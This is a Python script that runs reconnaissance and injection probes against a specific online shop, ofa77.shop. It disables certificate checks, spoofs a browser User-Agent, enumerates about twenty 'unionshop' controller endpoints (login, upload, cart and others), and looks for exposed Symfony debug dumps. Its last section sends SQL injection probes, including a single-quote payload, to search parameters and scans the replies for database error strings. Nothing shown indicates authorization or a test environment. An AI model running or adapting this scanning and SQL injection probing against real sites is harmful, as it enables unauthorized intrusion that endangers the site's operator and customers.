import httpx, re
c=httpx.Client(verify=False, follow_redirects=True, timeout=15,
    headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121 Safari/537.36'})
print('=== front controller methods (module/unionshop) ===')
paths=['module/unionshop/index/index','module/unionshop/index/category',
'module/unionshop/user/index','module/unionshop/user/info','module/unionshop/user/login',
'module/unionshop/user/register','module/unionshop/user/logout','module/unionshop/user/profile',
'module/unionshop/goods/index','module/unionshop/goods/list','module/unionshop/goods/search',
'module/unionshop/goods/detail','module/unionshop/goods/show',
'module/unionshop/order/index','module/unionshop/order/shopCartList','module/unionshop/order/addCart',
'module/unionshop/cart/index','module/unionshop/upload/index','module/unionshop/upload/upload',
'module/unionshop/member/index','module/unionshop/search/index','module/unionshop/search/search']
for p in paths:
    try:
        r=c.get('https://ofa77.shop/'+p)
        dbg='sf-dump' in r.text
        tag=f'{r.status_code} len={len(r.content)}' if not dbg else 'debug-dump'
        if r.status_code in(301,302): tag=f'{r.status_code}->{r.headers.get("location","")[:45]}'
        if not dbg and r.status_code==200 and len(r.content)>300:
            # capture title / form hints
            t=re.search(r'<title>([^<]*)</title>',r.text); 
            extra=(' title='+t.group(1)[:25]) if t else ''
            tag+=extra
        print(f'{p:45} {tag}')
    except Exception as e: print(p,'ERR',e)
# search param SQLi probe on goods
print('=== search SQLi probes ===')
for u in ['https://ofa77.shop/module/unionshop/goods/search?keyword=x','https://ofa77.shop/module/unionshop/goods/index?kw=x%27','https://ofa77.shop/module/unionshop/goods/list?keyword=x']:
    try:
        r=c.get(u)
        print(u,'->',r.status_code,'len',len(r.content),'dberr',bool(re.search(r'sql|syntax|mysql|query|pdo', r.text, re.I)))
    except Exception as e: print(u,'ERR',e)
